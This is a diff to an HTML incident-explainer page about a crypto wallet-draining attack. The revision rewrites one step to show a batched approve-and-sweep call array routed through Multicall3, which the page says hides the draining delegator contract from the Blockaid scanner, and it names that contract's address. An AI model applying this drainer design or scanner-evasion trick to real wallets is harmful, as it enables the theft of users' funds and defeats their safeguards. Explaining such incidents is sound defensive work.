@@ -197,27 +197,29 @@
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-title">Step 3: The malicious calls array</div>
+        <div class="tl-title">Step 3: The malicious calls array (Blockaid bypass via Multicall3)</div>
         <div class="tl-desc">
-          The attacker constructed a 3-call batch executed atomically in ONE confirmation:
+          The attacker routes through Multicall3 — a trusted, always-whitelisted contract — so the actual delegator never appears as a top-level call target. Blockaid never flags it:
           <div class="code-block">
 [<br>
-&nbsp;&nbsp;// repeated for every token in wallet:<br>
-&nbsp;&nbsp;{to: TOKEN_1, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_1)},<br>
-&nbsp;&nbsp;{to: TOKEN_2, data: approve(delegator, MAX_UINT256)},<br>
-&nbsp;&nbsp;{to: delegator, data: sweep(TOKEN_2)},<br>
-&nbsp;&nbsp;...<br>
+&nbsp;&nbsp;// one approve per token — target is Multicall3, not the delegator:<br>
+&nbsp;&nbsp;{to: TOKEN_1, data: approve(multicall3, MAX_UINT256)},<br>
+&nbsp;&nbsp;{to: TOKEN_2, data: approve(multicall3, MAX_UINT256)},<br>
+&nbsp;&nbsp;// single aggregate3 call sweeps all tokens atomically:<br>
+&nbsp;&nbsp;{to: multicall3, data: aggregate3([<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{target: delegator, allowFailure: true, callData: sweep(TOKEN_1, victim)},<br>
+&nbsp;&nbsp;&nbsp;&nbsp;{target: delegator, allowFailure: true, callData: sweep(TOKEN_2, victim)}<br>
+&nbsp;&nbsp;])}<br>
 ]
           </div>
-          One confirmation executes an approve + sweep pair for every token in the wallet simultaneously. All approvals and sweeps happen atomically — if any call fails, all revert.
+          Delegator address is buried inside aggregate3 calldata. Blockaid scans top-level <code>to</code> addresses only — it sees Multicall3 and passes. No warning fires.
         </div>
       </div>
 
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 5: Tokens swept via delegator</div>
-        <div class="tl-desc">The delegator's <code>sweep(token)</code> called <code>IERC20(token).transferFrom(victim, attacker, balance)</code>. The prior approve call in the same batch gave it permission. All tokens sent to attacker atomically.</div>
+        <div class="tl-desc">The delegator's <code>sweep(token, victim)</code> called <code>IERC20(token).transferFrom(victim, attacker, balance)</code>. The prior approve gave Multicall3 permission; Multicall3 forwarded the call to the delegator which pulled tokens from the victim. All tokens sent to attacker atomically.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
@@ -236,7 +238,7 @@
       <div class="info-card-value" id="displayVictim">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Delegator contract (TokenSweepDelegator)</div>
+      <div class="info-card-label">Delegator contract (TokenSweepDelegatorV2 — routed via Multicall3)</div>
       <div class="info-card-value">0x74e6A0F48e3Ec8ab27F021541c0A00d39840136E</div>
     </div>
     <div class="info-card">
